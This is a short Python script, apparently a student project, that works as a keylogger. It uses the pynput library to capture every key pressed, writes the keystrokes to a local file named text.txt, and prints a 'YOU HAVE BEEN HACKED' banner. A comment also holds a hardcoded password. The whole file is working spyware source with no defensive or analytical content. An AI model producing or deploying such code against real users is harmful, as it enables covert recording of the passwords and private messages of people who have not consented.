import pynput #used to keylog
import os.path #used to check if text.txt exists
from os import path
#password is iamastuyvesanthacker123@
from pynput.keyboard import Key, Listener

print("""

██    ██  ██████  ██    ██     ██   ██  █████  ██    ██ ███████     ██████  ███████ ███████ ███    ██     ██   ██  █████   ██████ ██   ██ ███████ ██████  
 ██  ██  ██    ██ ██    ██     ██   ██ ██   ██ ██    ██ ██          ██   ██ ██      ██      ████   ██     ██   ██ ██   ██ ██      ██  ██  ██      ██   ██ 
  ████   ██    ██ ██    ██     ███████ ███████ ██    ██ █████       ██████  █████   █████   ██ ██  ██     ███████ ███████ ██      █████   █████   ██   ██ 
   ██    ██    ██ ██    ██     ██   ██ ██   ██  ██  ██  ██          ██   ██ ██      ██      ██  ██ ██     ██   ██ ██   ██ ██      ██  ██  ██      ██   ██ 
   ██     ██████   ██████      ██   ██ ██   ██   ████   ███████     ██████  ███████ ███████ ██   ████     ██   ██ ██   ██  ██████ ██   ██ ███████ ██████  
                                                                                                                                                          
                                                                                                                                                          
""")
key_counter=0#every 5 keys write to file
keys=[] #list of keys
words_per_line=0 #8 words per line

#prints each keybard click
def keyboard_click(key):
    global key_counter, keys
    keys.append(key)
    key_counter+=1
    #every 5 keys, save into file and reset key_counter and keys list
    #to prevent premature closing of program without writing into file
    if key_counter>=5:
        key_counter=0
        write(keys)
        keys=[]
#If user clicks escape key, exit out of program
def exit(key):
    if key == Key.esc:
        return False

def write(keys): #writes the array of 10 keys
    #"w" for write a new file (text.txt)
    # "a" for write into already made file (text.txt)
    if path.exists("text.txt"): #if text.txt exists, write 
        with open("text.txt", "a") as file:
            process_input(keys, file)
    else:# if text.txt does not exists, create new file 
        with open("text.txt", "w") as file:
            process_input(keys, file)
def process_input(keys, file): #processing the pynput module
    global words_per_line
    for key in keys:
        char= str(key).replace("'","")
        if char=="Key.space":
            words_per_line+=1
            if words_per_line>=8: #every 8 words make a new line in text file
                    file.write("\n")
                    words_per_line=0
            else:
                file.write(" ")
                words_per_line=0
        elif char=="Key.enter":
            file.write("\n")
        elif char=="Key.backspace":
            file.write("\nBACKSPACE\n")
            words_per_line+=1
        elif char=="Key.shift" or char=="Key.ctrl_l":
            file.write("") #write nothing if weird keys are entered
        else:
            file.write(char)
#runs program
with Listener (on_press=keyboard_click, on_release=exit) as listener:
    listener.join()

"social implications //hardware keyloggers"

